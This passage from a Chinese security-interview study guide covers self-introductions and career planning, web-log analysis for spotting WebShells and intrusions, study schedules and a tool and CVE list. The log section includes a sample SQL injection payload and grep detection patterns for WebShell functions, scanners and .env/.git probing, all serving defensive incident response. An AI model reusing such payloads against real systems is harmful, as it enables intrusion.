
考察意图：考察表达能力与项目经验。回答要点：报告结构 + 可视化 + 应对提问。易错点：只说结构不结合实际。面试官想听到：能讲清红队 vs 蓝队报告差异（红队偏攻击复现、蓝队偏检测响应）、脱敏合规要求、PPT 汇报技巧。

**考察知识点**：

- 红队 vs 蓝队报告差异
- 证据完整 + 可复现
- 脱敏合规
- PPT 数据可视化

---


### 第 81 天（精讲） ★★★ 安全岗位面试自我介绍与职业规划


**主题**：软技能与场景 / 自我介绍

**答案**：

自我介绍 + 职业规划是面试开场 / 收官核心环节，决定面试官第一印象。

**1. 自我介绍结构（2-3 分钟）**：

**A. 基本信息（30 秒）**：
- 姓名、学历、专业
- 工作年限 + 当前职位
- 核心技术方向（一句话定位）

**B. 核心能力（60 秒，**最重要**）**：
- 三大核心技术栈（如：渗透测试 / 应急响应 / 代码审计）
- 标志性项目经验（1-2 个）
- 行业认证（CISSP / OSCP / CISP / PMP）
- 技术影响力（公众号 / Github / 技术博客）

**C. 业绩亮点（60 秒）**：
- 数据化成果：
  - "主导过 XX 次护网行动，作为蓝队队长取得 X 次反制成功"
  - "发现过 XX 个高危漏洞，包括 Log4Shell / Spring4Shell 等公开漏洞"
  - "负责过 XX 个等保测评项目，覆盖金融 / 政务 / 能源行业"
- 业务价值：
  - "为公司节约 XX 万元安全运营成本"
  - "主导搭建 SOC 平台，覆盖 XX 个资产"

**D. 求职动机（30 秒）**：
- 为什么选择贵公司？
  - 业务匹配度（金融 / 互联网 / 政府）
  - 技术成长空间
  - 团队氛围

**E. 职业规划（30 秒）**：
- 短期（1-2 年）：深耕技术
- 中期（3-5 年）：技术专家 / 团队管理
- 长期（5 年+）：安全架构师 / CISO

**2. 加分项**：
- 公开漏洞编号（CVE / CNVD / 漏洞盒子 / 补天）
- 技术文章 / 书籍出版
- 安全会议演讲（KCon / CanSecWest / XCon）
- 获奖（HW 优秀个人 / 蓝队 MVP）

**3. 减分项**：
- 流水账叙述
- 只背技术名词不结合项目
- 时间超时（>5 分钟）
- 照读简历
- 暴露负面信息（吐槽前公司）

**4. 面试高频问题**：

**A. 为什么离开上一家公司？**
- 正确：业务调整 / 技术栈匹配 / 成长空间
- 错误：薪资低 / 领导差 / 加班多

**B. 你的优缺点？**
- 优点配案例：
  - "我做事细致，X 次护网中没出过误报漏报"
- 缺点配改进：
  - "我之前偏技术不擅表达，现在每周做团队技术分享"

**C. 你的期望薪资？**
- 调研市场价：拉勾 / Boss / 猎聘
- 给范围而非定值：30-40K
- 不提前说"面议"留谈判空间

**D. 5 年职业规划？**
- T 型发展：
  - 纵向：深耕一个领域（红队 / 蓝队 / 合规）
  - 横向：拓展相邻技能（开发 + 安全、产品 + 安全）
- 3-5 年：安全架构师 / 高级专家
- 5 年+：CISO / 安全总监

**E. 为什么选我们公司？**
- 准备公司调研：
  - 业务领域（金融 / 电商 / 游戏）
  - 技术栈（云原生 / 大数据）
  - 安全团队规模
  - 行业地位
- 表达匹配度

**5. 反向提问环节**：
- "团队当前最关注的安全问题是什么？"
- "这个岗位的成长路径是？"
- "团队技术栈和工具链是？"
- "未来一年团队重点方向？"

**6. 简历撰写要点**：
- 一页最佳，技术岗两页可接受
- STAR 法则：情境 + 任务 + 行动 + 结果
- 数据化：
  - "搭建 WAF 规则 200+ 条，拦截攻击 50 万次/日"
  - "管理资产 1000+，发现漏洞 300+"
- 技术关键词与 JD 匹配
- GitHub / 技术博客加分

**7. 实战技巧**：
- 准备 3 个深度案例（每个 10 分钟讲不完）
- 准备 5 分钟精简版自我介绍
- 准备英文自我介绍（外企）
- 着装得体

**面试官心理**：
- 自我介绍考察：表达逻辑、亮点提炼、自我认知
- 职业规划考察：稳定性、成长潜力、岗位匹配

**经典雷区**：
- "我什么都做过" → 没专精
- "我对安全很感兴趣" → 没具体成果
- "我学习能力强" → 缺例证
- "我想做管理" → 高级岗加分，应届生减分

**解析**：

考察意图：开场 + 收官关键环节。回答要点：自我介绍结构 + 反向提问。易错点：流水账叙述。面试官想听到：能讲清 STAR 法则简历、数据化业绩、3-5 年 T 型发展规划。

**考察知识点**：

- STAR 法则写经历
- 数据化业绩展示
- T 型职业规划
- 反向提问技巧

---


### 第 82 天（精讲） ★★★ Web 日志分析定位 WebShell 与入侵痕迹


**主题**：应急响应与取证 / Web 日志分析

**答案**：

Web 日志分析是应急响应核心技能，从 Apache / Nginx / IIS 日志中还原攻击链。

**1. 日志格式**：
Nginx：
```
$remote_addr - $remote_user [$time_local] "$request" $status $bytes "$referer" "$user_agent"
```
例：`192.168.1.10 - - [22/Sep/2024:10:23:45 +0800] "GET /index.php?id=1' UNION SELECT 1,2,3-- - HTTP/1.1" 200 1234 "-" "Mozilla/5.0"`

**2. 分析工具链**：
- 命令行：grep / awk / sed（必会）
- GoAccess：实时 Web 日志分析
- ELK Stack：Elasticsearch + Logstash + Kibana
- Splunk：商业 SIEM
- AWStats / Webalizer：日志统计

**3. 常见入侵痕迹排查**：

**A. SQL 注入痕迹**：
```bash
grep -i "union\|select\|concat\|0x\|benchmark" access.log
grep -E "(%27|')" access.log | grep -iE "union|select"
```
关注：union、select、concat、sleep、benchmark、xp_cmdshell

**B. WebShell 访问痕迹**：
```bash
grep -iE "\.php\?.*=.*(eval|exec|system|assert)" access.log
grep -E "(eval|assert|base64_decode)" access.log
grep -iE "\.php\?[a-z]+=" access.log | grep -v "google\|bing"   # 可疑参数
```
关注：访问 .php?a=eval(...) 类请求、POST 长参数

**C. WebShell 上传痕迹**：
```bash
grep -i "upload\|fileupload\|writefile\|move_uploaded" access.log
grep " 200 " access.log | grep -iE "\.(jsp|asp|aspx|php)$"  # 上传后访问
```

**D. 扫描器痕迹**：
```bash
grep -E "(sqlmap|nikto|nmap|masscan|wpscan|acunetix|nessus)" access.log   # UA
grep -E "(\.env|\.git|robots\.txt|phpmyadmin|admin)" access.log         # 探测路径
```

**E. 暴力破解**：
```bash
awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -20   # 高频 IP
awk '/POST.*login/{print $1}' access.log | sort | uniq -c | sort -rn | head -20   # 登录高频 IP
grep " 401 " access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head -20   # 401 错误高频 IP
```

**F. 反弹连接**：
- WebShell 出网通常走 bash / python / perl
- 检查服务器出站连接：`netstat -an | grep ESTABLISHED`

**4. WebShell 文件查找**：

**A. 时间窗匹配（日志中首次上传时间）**：
```bash
find /var/www -type f -newermt "2024-09-22 10:00" ! -newermt "2024-09-22 11:00"
```

**B. 特征匹配**：
```bash
grep -rE "(eval|assert|base64_decode|gzinflate|str_rot13|\$_(GET|POST|REQUEST))" /var/www/*.php
grep -rE "(JspSpy|wscript|cmd\.exe|ShellExcute)" /var/www/*.jsp
```

**C. 文件静态特征（D 盾/河马）**：
- WebShell 检测工具特征库（基于 opcode、混淆模式）
- 文件大小异常（极小或极大）
- 创建时间在业务上线后
- 文件属主异常（www-data 创建的 shell 脚本）

**D. PHP 危险函数扫描**：
```bash
grep -rE "\b(eval|assert|create_function|preg_replace)\b" /var/www/
```

**E. 文件完整性**：
- AIDE / Tripwire 对比基线哈希
- Git 版本对比

**5. 取证深度分析**：

**A. 隐藏 WebShell**：
- 无文件 WebShell（.htaccess 注入 PHP 代码）
- 内存 WebShell（Java Agent、PHP OPcache）
- 数据库 WebShell（MySQL INTO OUTFILE）
- 计划任务 WebShell（crontab 反弹）

**B. 检测技巧**：
- .htaccess 异常重写规则
- `find / -perm -u+s`（SUID）
- `crontab -l` + `/var/spool/cron/`
- `/etc/rc.local` / `/etc/init.d/` 异常服务
- /tmp /var/tmp 可执行文件

**C. 时间线分析（Timeline）**：
- 文件创建时间
- 进程启动时间
- 网络连接时间
- 日志时间
- 用 Plaso / log2timeline 统一时间轴

**6. 应急响应 SOP（Web 入侵）**：
1. 隔离：断网 / IP 黑名单
2. 备份：磁盘镜像、内存镜像
3. 取证：抓 webshell + 日志
4. 溯源：攻击者 IP、漏洞点、攻击路径
5. 清除：删 webshell、修复漏洞、改口令
6. 加固：补丁、最小权限、WAF 规则
7. 复盘：写报告、修补流程

**面试追问**：
- 如何从日志定位 0day 攻击？答：找异常 UA、异常请求方法、大文件 POST
- 时间线如何统一？答：用 log2timeline / Plaso 工具以 MAC 时间 + mtime + 日志时间
- 如何避免日志被清理？答：远程 syslog、ELK 集中、双写日志

**解析**：

考察意图：日志分析是 IR 基础。回答要点：命令 + WebShell 检测 + 时间线。易错点：只背命令不分析。面试官想听到：能讲清无文件 WebShell（.htaccess / 计划任务 / memory）、日志集中化（防被清）、plaso 时间线分析。

**考察知识点**：

- 日志特征匹配命令
- 无文件 WebShell 检测
- 时间线取证
- 日志集中化防篡改

---

## 每日学习计划

### 60 天版本（每天 1 题，约 2 个月）

| 周次 | 主题 | 题目序号 | 重点 |
|------|------|----------|------|
| Week 1 | 网络安全基础 | 1-3 | TCP/HTTPS/Cookie |
| Week 2 | Web 安全核心 | 4-10 | SQLi/XSS/CSRF/SSRF/XXE/文件上传/OWASP |
| Week 3 | Web 安全延伸 | 11-14 | 中间件/PHP/反序列化/逻辑 |
| Week 4 | 渗透测试方法论 | 15-17 | PTES/外网打点/蓝队反制 |
| Week 5 | 提权与内网 | 18-23 | Win/Linux/MSSQL UDF/Kerberos/票据/PtH |
| Week 6 | 内网+应急响应 | 24-26 | 横向移动/应急响应/Windows 日志 |
| Week 7 | 数据库+代码审计 | 27-34 | 反序列化/PHP/MySQL UDF/MongoDB/审计/RSA |
| Week 8 | 漏洞 POC 专题 | 35-46 | Log4j2/Shiro/Fastjson/Spring4Shell/Struts2 |
| Week 9 | 工具与移动 | 47-54 | Sqlmap/MSF/CS/APK 逆向/抓包/Linux 加固 |
| Week 10 | 综合+软技能 | 55-60 | IIS/护网/PKI/护网报告/自我介绍 |

### 二刷建议（按主题）

1. **Web 安全**（11 题）：第 1 周 - 重点：SQLi/XSS/CSRF/SSRF/XXE/文件上传
2. **漏洞 POC**（6 题）：第 2 周 - 重点：Log4j2/Shiro/Fastjson
3. **工具使用**（5 题）：第 3 周 - 重点：Burp + Sqlmap + MSF
4. **内网渗透**（4 题）：第 4 周 - 重点：Kerberos/票据/PtH

---

## 面试临场技巧

### 5 步答题法（STAR + Tech）

1. **S**ituation（30 秒）：背景 + 这道题对应什么攻击/场景
2. **T**ask（30 秒）：原理 / 概念一句话点明
3. **A**ction（2 分钟）：分类 + 案例 + 真实工具/命令
4. **R**esult（30 秒）：总结一句话
5. **Tech 深度（30 秒）**：补充一个加分技术细节（如绕过变种、历史 CVE、业内案例）

### 反向问题清单（必背）

```
1. 团队当前最关注的安全问题是什么？
2. 安全团队的人员结构和分工？
3. 内部技术分享 / 培训机制是怎样的？
4. 是否有内部 SRC / 漏洞奖励机制？
5. 未来一年团队重点投入方向？
6. 这个岗位的核心 KPI 是什么？
7. 是否有外部会议 / 培训预算？
8. 团队使用的主要工具链是？
```

---

## 进阶资源清单

### 必装工具

| 类别 | 工具 | 用途 |
|------|------|------|
| 抓包 | Burp Suite Pro | Web 渗透测试 |
| 扫描 | Nmap / Masscan | 端口扫描 |
| 漏洞利用 | Metasploit / SQLMap | 漏洞验证 |
| 团队协作 | Cobalt Strike | 红队 C2 |
| 内网穿透 | frp / nps / chisel | 代理穿透 |
| 漏洞靶场 | DVWA / Vulnhub / HackTheBox | 练习 |
| 移动逆向 | jadx / apktool / Frida | APK 分析 |
| 代码审计 | Fortify / SonarQube | 静态扫描 |
| SOC 平台 | ELK / Splunk / 墨菲 | 日志分析 |

### 学习资料

- **官方文档**：OWASP Top 10、NIST SP 800-61（IR）、PTES
- **国内社区**：先知社区、安全客、看雪论坛、FreeBuf
- **国外社区**：PortSwigger Academy、HackTricks、PayloadsAllTheThings
- **靶场**：TryHackMe、HackTheBox、Vulnhub、DVWA、bWAPP
- **漏洞库**：CVE / CNVD / CNNVD / NVD

### 必读 CVE（重点关注）

- Log4Shell：CVE-2021-44228
- Spring4Shell：CVE-2022-22965
- ProxyLogon：CVE-2021-26855
- PrintNightmare：CVE-2021-34527
- EternalBlue：MS17-010（CVE-2017-0144）
- Dirty COW：CVE-2016-5195
- DirtyPipe：CVE-2022-0847
- Heartbleed：CVE-2014-0160
- Struts2 S2-045 / S2-061
- Shiro-550：CVE-2016-4437

---

## 30 天速成版（精选 30 题）

如时间紧张，可只刷以下 30 题（保留重要度 5 和高频 4，覆盖 90% 考点）：

1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 14, 15, 16, 17, 18, 19, 22, 23, 24, 25, 27, 30, 32, 33, 34, 37, 38, 50, 56

---



